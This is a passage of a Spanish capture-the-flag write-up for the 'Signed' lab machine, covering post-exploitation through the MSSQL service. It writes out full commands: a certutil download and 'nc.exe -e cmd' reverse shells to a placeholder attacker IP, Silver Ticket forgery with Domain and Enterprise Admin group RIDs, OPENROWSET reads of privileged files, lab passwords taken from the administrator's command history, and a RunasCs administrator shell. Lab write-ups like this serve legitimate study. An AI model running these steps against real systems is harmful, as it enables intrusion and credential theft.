```bash
locate nc.exe
/usr/lib/mono/4.5/cert-sync.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

cp /usr/share/windows-resources/binaries/nc.exe .
```

Levanta un servidor con **python3**:
```bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde la sesión del **MSSQL**, copiemos el binario en un directorio temporal usando **certutil**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "mkdir C:\Temp"
...
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "certutil.exe -urlcache -split -f http://Tu_IP/nc.exe C:\Temp\nc.exe"
...
CertUtil: -URLCache command completed successfully.
```

Abre un listener con **rlwrap** y **netcat**:
```bash
rlwrap nc -nlvp 443
listening on [any] 443 ...
```

Usa el binario **nc.exe** para mandar una sesión **CMD** al listener:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> xp_cmdshell "C:\Temp\nc.exe -e cmd Tu_IP 443"
```

Observa la **netcat**:
```batch
rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.90] 61311
Microsoft Windows [Version 10.0.17763.7309]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
signed\mssqlsvc
```
Estamos dentro.

Encontraremos la flag del usuario en el escritorio:
```batch
C:\Windows\system32>cd C:\Users\mssqlsvc\Desktop
cd C:\Users\mssqlsvc\Desktop

C:\Users\mssqlsvc\Desktop>type user.txt
type user.txt
...
```

## Post Explotación {#Post}

### Abusando de Función OPENROWSET para Leer Archivos Privilegiados del Sistema {#OPENROWSET}

Utilizando herramientas como **winPEASx64** y **adPEAS** no encontramos algo que nos ayude a escalar privilegios.

Además, queda bastante claro que la máquina está muy enfocada en explotar activamente el **servicio MSSQL**.

Buscando un poco lo que podemos hacer, una de las opciones que tenemos es leer archivos internos de forma arbitraria usando la función **OPENROWSET**:

| **Función OPENROWSET** |
|:----:|
| *OPENROWSET es una función de acceso a datos de Microsoft SQL Server que permite consultar datos externos como si fueran tablas locales. Nos puede servir para acceder a otros servidores SQL (mediante OLE DB), leer archivos directamente desde el sistema de archivos (por ejemplo, texto, CSV, XML, etc.) usando la opción BULK e mportar datos ad-hoc, sin necesidad de crear un linked server.* |

Aquí te dejo un par de blogs sobre qué podemos hacer con esta función:
* <a href="https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/" target="_blank">Using OPENROWSET to read large files into SQL Server</a>
* <a href="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html#read-file-with-openrowset" target="_blank">HackTricks: 1433 - Pentesting MSSQL - Microsoft SQL Server - Read file with OPENROWSET</a>

¿Cuál es la idea? Tratar de leer archivos que solo un administrador puede hacer dentro de la **máquina víctima / dominio AD**.

Para hacer esto, necesitamos cumplir con algunos requisitos:
* Necesitamos tener el rol de **sysadmin**, que ya tenemos en nuestra sesión, para usar la **función OPENROWSET**.
* Comprobar que nuestra sesión pueda usar la **función OPENROWSET**, pues debemos tener los permisos **ADMINISTER BULK OPERATIONS** o **ADMINISTER DATABASE BULK OPERATIONS**.
* Para leer archivos que solo un administrador puede, necesitamos estar dentro del **grupo Domain Admins**.
* En caso de ser necesario y aunque no lo sea, también podemos agregarnos dentro del **grupo Enterprise Admins**.

Expliquemos estos 2 grupos.

| **Grupo Domain Admins** |
|:-----------------------:|
| *El grupo Domain Admins es un grupo global predefinido en Active Directory (AD) que tiene control total sobre todos los objetos dentro del dominio. Cualquier usuario que pertenezca a este grupo posee privilegios administrativos sobre: Todas las cuentas de usuario, grupos y equipos del dominio. El Controlador de Dominio (DC) y sus servicios (LDAP, Kerberos, DNS, etc.). Las máquinas unidas al dominio, ya que por defecto los Domain Admins son añadidos al grupo local “Administrators” de cada equipo miembro. * |

Su **SID** común es: `S-1-5-<DomainID>-512`.

**512** es el **RID** asociado a este grupo en todos los dominios.

| **Grupo Enterprise Admins** |
|:---------------------------:|
| *El grupo Enterprise Admins es un grupo universal predefinido que existe solo en el dominio raíz del bosque de Active Directory. Sus miembros tienen privilegios administrativos en todos los dominios del bosque, no solo en uno.* |

SU **SID** común es: `S-1-5-<RootDomainID>-519`.

**519** es el **RID** fijo de este grupo.

Usando la misma lógica que usamos para crear el primer **Silver Ticket**, podríamos intentar crear otro para que nuestro usuario esté dentro de esos 2 grupos y así podamos leer cualquier archivo del sistema.

Antes que nada, comprobemos si existe y podemos usar la función **OPENROWSET**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
entity_name   subentity_name   permission_name              
-----------   --------------   --------------------------   
server                         ADMINISTER BULK OPERATIONS
```
Si existe y podemos usarla, pues vemos que tenemos el permiso **ADMINISTER BULK OPERATIONS**.

Para esto necesitamos los **RID** de los grupos **Domain Admins** y **Enterprise Admins**, que aunque ya sabemos cuáles son, podemos obtenerlos de la siguiente manera:
```batch
C:\Users\mssqlsvc\Desktop>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\mssqlsvc\Desktop> Get-ADGroup "Domain Admins" | Select-Object Name, SID
Get-ADGroup "Domain Admins" | Select-Object Name, SID

Name          SID                                          
----          ---                                          
Domain Admins S-1-5-21-4088429403-1159899800-2753317549-512

PS C:\Users\mssqlsvc\Desktop> Get-ADGroup "Enterprise Admins" | Select-Object Name, SID
Get-ADGroup "Enterprise Admins" | Select-Object Name, SID

Name              SID                                          
----              ---                                          
Enterprise Admins S-1-5-21-4088429403-1159899800-2753317549-519
```

También podemos obtenerlos desde la sesión de **MSSQL**, pero solo si tenemos los privilegios dentro de la máquina víctima:
```batch
SELECT SUSER_SID('SIGNED\\Domain Admins');
SELECT SUSER_SID('SIGNED\\Enterprise Admins');
```

Y volvemos a crear nuestro **Silver Ticket**:
```batch
impacket-ticketer -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 512,519,1105 -user-id 1103 mssqlsvc -nthash **********
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Exportamos el **archivo ccache** en la variable de entorno:
```bash
export KRB5CCNAME=mssqlsvc.ccache
```

Y nos volvemos a autenticar al **MSSQL** con este nuevo ticket:
```batch
impacket-mssqlclient -k -no-pass DC01.SIGNED.HTB
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232) 
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

Habilitemos la función **OPENROWSET**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXEC sp_configure 'Ad Hoc Distributed Queries', 1;
INFO(DC01): Line 196: Configuration option 'Ad Hoc Distributed Queries' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
```

Ya podemos leer cualquier archivo que solo el **Administrador** puede, por ejemplo, la flag del **Administrador**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt',SINGLE_CLOB) AS flag;
BulkColumn                                
---------------------------------------   
b'**********'
```
Pero uno de los más importantes que siempre debemos tener en cuenta, es el historial de comandos.

Apuntemos al historial de comandos de **PowerShell** del **Administrador**:
```batch
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt',SINGLE_CLOB) AS history;
BulkColumn                                                                                                                                                                                                                                                        
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
b'# Domain`\n$Domain = "signed.htb"`\n`\n# Groups`\n$Groups = @("HR","IT","Finance","Developers","Support")`\n`\nforeach ($grp in $Groups) 
{`\n    if (-not (Get-ADGroup -Filter "Name -eq \'$grp\'" -ErrorAction SilentlyContinue)) {`\n        
New-ADGroup -Name $grp -GroupScope Global -GroupCategory Security`\n    }`\n}`\n`\n# Users: Username, Password, Group`\n$Users = @(`\n    
@{Username="oliver.mills";       Password="!Abc987321$"; Group="HR"},`\n    
@{Username="emma.clark";         Password="!Xyz654789#"; Group="HR"},`\n    
@{Username="liam.wright";        Password="!Qwe123789&"; Group="HR"},`\n`\n    
@{Username="noah.adams";         Password="!ItDev456$"; Group="IT"},`\n
...
```
Podemos ver los usuarios que se crearon en la máquina y casi al final.

Analizándolo profundamente, podremos encontrar la contraseña en texto plano del **Administrador**:
```batch
...
$Settings -User "SIGNED\\Administrator" -Password "Welcome1"\r\ncd ..\\Documents\\\r\nnotepad restart.ps1\r\nexplorer .\r\ndir 
..\\Desktop\\\r\nmove ..\\Desktop\\cleanup.ps1 .\r\ndir ..\\Desktop\\\r\ndir\r\nGet-NetConnectionProfile\r\nSet-ADAccountPassword 
-Identity "Administrator" -NewPassword (ConvertTo-SecureString "**********" -AsPlainText -Force)
...
```
Tenemos su contraseña nueva.

### Ganando Acceso a la Máquina Víctima como Administrador Usando RunasCs {#RunasCs}

Podríamos mandarnos una sesión remota de **PowerShell** para conectarnos como el **Administrador**, pero tenemos una opción mejor, que es usar la herramienta **RunasCs**.

La puedes descargar en el siguiente link:
* <a href="https://github.com/antonioCoco/RunasCs" target="_blank">Repositorio de AntonioCoco: RunasCs</a>

Esta herramienta nos permite ejecutar acciones como cualquier usuario, solamente dando el nombre del usuario, la credencial y el comando a ejecutar.

Nos servirá para mandarnos una sesión de **Administrador** a un listener, tal y como lo hicimos con el binario **nc.exe**.

Una vez que la descargues, envíala a la máquina víctima levantando un servidor con **python3** y usando **certutil**:
```batch
C:\Temp>certutil.exe -urlcache -split -f http://Tu_IP/RunasCs.exe RunasCs.exe
...
CertUtil: -URLCache command completed successfully.
```

Levanta un listener con **rlwrap** y **netcat**:
```bash
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
```

Aprovechando que tenemos el binario **nc.exe**, usa **RunasCs.exe** para que ejecute el binario **nc.exe** y envíe una sesión a nuestro listener:
```batch
C:\Temp>RunasCs.exe Administrator Th1s889Rabb!t "C:\Temp\nc.exe -e cmd Tu_IP 1337" -t 0
RunasCs.exe Administrator Th1s889Rabb!t "C:\Temp\nc.exe -e cmd Tu_IP 1337" -t 0

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-53d73$\Default
[+] Async process 'C:\Temp\nc.exe -e cmd Tu_IP 1337' with pid 712 created in background.
```

Observa la **netcat**:
```batch
rlwrap nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.90] 56968
Microsoft Windows [Version 10.0.17763.7309]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
signed\administrator
```
Excelente, tenemos la sesión como **Administrador**.

Obtengamos la última flag:
```batch
C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>type root.txt
type root.txt
...
```
Y con esto, terminamos la máquina.
